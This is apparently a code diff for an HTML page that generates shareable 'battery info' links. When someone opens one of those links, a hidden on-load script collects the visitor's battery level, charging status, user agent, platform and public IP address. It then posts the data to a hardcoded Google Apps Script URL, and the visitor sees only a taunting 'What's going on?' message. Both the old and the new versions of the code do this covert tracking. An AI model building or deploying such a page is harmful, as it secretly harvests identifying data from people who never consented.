@@ -3,54 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>What's Going On?</title>
-</head>
-<body>
-    <h1>What's going on? 😏</h1>
-
-    <!-- Button to Generate Tracking Link -->
-    <button onclick="generateLink()">Generate Link</button>
-    <p id="link"></p>
-
+    <title>Battery Info Link Generator</title>
     <script>
         function generateLink() {
-            const uniqueID = Math.random().toString(36).substr(2, 8); // Generate a random ID
-            const link = `${window.location.href}?id=${uniqueID}`;
-            document.getElementById("link").innerHTML = `<a href="${link}" target="_blank">${link}</a>`;
+            const uniqueID = Math.random().toString(36).substring(2, 8); // Random ID
+            const url = window.location.origin + window.location.pathname + "?id=" + uniqueID;
+            
+            // Display the link
+            document.getElementById("generatedLink").innerHTML = `
+                <input type="text" value="${url}" id="linkBox" readonly>
+                <button onclick="copyLink()">Copy Link</button>
+            `;
         }
 
-        async function sendData() {
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                const batteryLevel = battery.level * 100;
-                const chargingStatus = battery.charging ? "Charging" : "Not Charging";
-                const userAgent = navigator.userAgent;
-                const platform = navigator.platform;
+        function copyLink() {
+            const linkBox = document.getElementById("linkBox");
+            linkBox.select();
+            document.execCommand("copy");
+            alert("Link copied! Share it.");
+        }
 
-                // Get IP Address
-                const ipResponse = await fetch("https://api64.ipify.org?format=json");
-                const ipData = await ipResponse.json();
-                const ipAddress = ipData.ip;
+        async function sendDataToSheets(batteryLevel, chargingStatus, userAgent, platform, ip) {
+            const sheetURL = "https://script.google.com/macros/s/AKfycbztrGBTr8dvHV9_jmVxAMc9m-MAuu5hL-0_hWT8r3h-VI4abO-AVDKCoeQAml44LYGHmw/exec";
+            
+            fetch(sheetURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    battery: batteryLevel + "%",
+                    charging: chargingStatus,
+                    device: userAgent,
+                    platform: platform,
+                    ip: ip
+                })
+            });
+        }
 
-                // Send data to Google Sheets
-                fetch("https://script.google.com/macros/s/AKfycbztrGBTr8dvHV9_jmVxAMc9m-MAuu5hL-0_hWT8r3h-VI4abO-AVDKCoeQAml44LYGHmw/exec", { 
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        battery: batteryLevel + "%",
-                        charging: chargingStatus,
-                        device: userAgent,
-                        platform: platform,
-                        ip: ipAddress
-                    })
-                });
+        async function trackUser() {
+            if (new URLSearchParams(window.location.search).has("id")) {
+                document.body.innerHTML = "<h2>What's going on? 😏</h2>";
+
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    const batteryLevel = Math.round(battery.level * 100);
+                    const chargingStatus = battery.charging ? "Yes" : "No";
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+
+                    // Get IP Address
+                    try {
+                        const ipResponse = await fetch("https://api64.ipify.org?format=json");
+                        const ipData = await ipResponse.json();
+                        const ipAddress = ipData.ip;
+
+                        sendDataToSheets(batteryLevel, chargingStatus, userAgent, platform, ipAddress);
+                    } catch (error) {
+                        console.error("Failed to get IP:", error);
+                    }
+                }
             }
         }
-
-        // Check if the page was opened from a generated link (if "?id=" is in URL)
-        if (window.location.search.includes("?id=")) {
-            sendData(); // Send battery & device info when someone clicks the link
-        }
     </script>
+</head>
+<body onload="trackUser()">
+    <h2>Battery Info Link Generator</h2>
+    <button onclick="generateLink()">Generate Link</button>
+    <p id="generatedLink"></p>
 </body>
 </html>
